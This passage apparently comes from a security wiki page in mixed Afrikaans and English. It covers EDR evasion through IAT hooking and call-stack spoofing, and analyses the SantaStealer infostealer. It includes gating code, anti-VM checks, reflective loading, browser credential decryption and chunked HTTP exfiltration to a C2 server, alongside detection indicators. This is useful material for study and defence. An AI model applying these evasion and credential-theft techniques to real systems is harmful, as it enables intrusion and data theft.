  - Call‑stack spoofing: bou 'n onskadelike stack en oorgang na die teiken‑API sodat call‑stack‑analise na verwagte rame oplos.
- Vir verenigbaarheid, eksporteer 'n interface sodat 'n Aggressor‑script (of ekwivalent) kan registreer watter APIs om te hook vir Beacon, BOFs en post‑ex DLLs.

Waarom IAT hooking hier
- Werk vir enige kode wat die gehookte import gebruik, sonder om tool‑kode te wysig of op Beacon te staatmaak om spesifieke APIs te proxy.
- Dek post‑ex DLLs: hooking LoadLibrary* laat jou toe om module‑laaie (bv. System.Management.Automation.dll, clr.dll) te onderskep en dieselfde masker/stack‑ontduiking op hul API‑oproepe toe te pas.
- Herstel betroubare gebruik van proses‑spawning post‑ex opdragte teen call‑stack‑gebaseerde detections deur CreateProcessA/W te wikkel.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Aantekeninge
- Pas die patch toe ná relocations/ASLR en voor die eerste gebruik van die import. Reflective loaders like TitanLdr/AceLdr toon hooking tydens DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; los die ware API op via die oorspronklike IAT-waarde wat jy gevang het voor patching of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en vermy om skryfbare+uitvoerbare bladsye te laat staan.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bou 'n valse call chain (terugadresse na onskadelike modules) en pivot dan na die werklike API.
- Dit omseil opsporing wat verwag dat canonical stacks van Beacon/BOFs na sensitiewe APIs lei.
- Kombineer met stack cutting/stack stitching techniques om binne verwagte rame te beland voor die API proloog.

Operasionele integrasie
- Voeg die reflective loader voor die post‑ex DLLs sodat die PIC en hooks outomaties geïnitialiseer word wanneer die DLL gelaai word.
- Gebruik 'n Aggressor script om teiken APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde ontduikingspad sonder kodawysigings.

Detection/DFIR oorwegings
- IAT-integriteit: inskrywings wat oplos na non‑image (heap/anon) adresse; periodieke verifikasie van import pointers.
- Stapel anomalieë: terugadresse wat nie aan gelaaide images behoort nie; skielike oorgange na non‑image PIC; inkonsekwente RtlUserThreadStart-afkoms.
- Loader-telemetrie: in-proses skrywings na IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX-streke geskep by laai.
- Image-load ontduiking: as daar hooking van LoadLibrary* is, hou dop verdagte laaie van automation/clr assemblies wat gekorreleer word met memory masking events.

Verwante boublokke en voorbeelde
- Reflective loaders wat IAT patching tydens laai uitvoer (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) en stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustreer hoe moderne info-stealers AV bypass, anti-analysis en credential access in 'n enkele workflow meng.

### Keyboard layout gating & sandbox delay

- 'n Config flag (`anti_cis`) enumereer die geïnstalleerde keyboard layouts via `GetKeyboardLayoutList`. As 'n Cyrillic layout gevind word, gooi die sample 'n leë `CIS`-merker en beëindig voordat dit stealers hardloop, wat verseker dat dit nooit op uitgesluit lokaliteite aktiveer nie, terwyl dit 'n hunting artefak agterlaat.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Gelaagde `check_antivm` logic

- Variant A loop deur die proseslys, hash elke naam met 'n pasgemaakte rolling checksum, en vergelyk dit teen ingebedde blocklists vir debuggers/sandboxes; dit herhaal die checksum oor die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B inspekteer stelsel-eienskappe (process-count floor, recente uptime), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox additions te ontdek, en voer timing checks rondom sleeps uit om single-stepping op te spoor. Enige tref veroorsaak afbreking voordat modules geloods word.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` loop deur 'n globale `memory_generators` function-pointer tabel en spawn een thread per geaktiveerde module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Elke thread skryf resultate in gedeelde buffers en rapporteer sy lêertelling na 'n ~45s join-venster.
- Sodra dit klaar is, word alles ge-zip met die staties gekoppelde `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` slaap dan 15s en stream die argief in 10 MB stukke via HTTP POST na `http://<C2>:6767/upload`, spoofing 'n browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Elke stuk voeg `User-Agent: upload`, `auth: <build_id>`, opsionele `w: <campaign_tag>` by, en die laaste stuk heg `complete: true` aan sodat die C2 weet dat herassamelings klaar is.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
